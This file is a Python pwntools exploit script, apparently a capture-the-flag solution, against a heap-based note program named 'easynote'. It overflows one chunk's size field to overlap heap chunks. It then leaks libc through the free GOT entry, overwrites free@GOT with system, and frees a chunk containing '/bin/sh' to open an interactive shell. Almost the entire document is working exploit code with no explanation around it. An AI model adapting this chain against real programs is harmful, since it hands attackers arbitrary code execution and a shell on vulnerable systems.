#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
r  = remote('0.0.0.0',9999)

libc_binary = ELF('/lib/x86_64-linux-gnu/libc.so.6')
binary = ELF('./easynote')
# context.log_level ='debug'
context.terminal = ['tmux','splitw','-h']
def create(size,content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline("0")
    r.recvuntil(":")
    r.sendline("0")
    r.recvuntil(":")
    r.sendline(content)

def edit(idx,content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(content)

def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def delete(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

free_got = binary.got['free']
print ('got is ',hex(free_got))
create(0x28,"aaaa") 
create(0x20,"bbbb") 
edit(0, "/bin/sh\x00" +"a"*0x20 + "\x61")
delete(1)


create(0x50,p64(0)*6 +p64(0x50) + p64(0) +p64(0)+p64(free_got)) 
# gdb.attach(r)
# raw_input('#')

show(1)
r.recvuntil("Content : ")
data = r.recvuntil("Done !")

free_addr = u64(data.split(b"\n")[0].ljust(8,b"\x00"))
libc = free_addr - libc_binary.symbols['free'] 
print ("libc:",hex(libc))
system = libc + libc_binary.symbols['system']
edit(1,p64(system))

delete(0)
r.interactive()
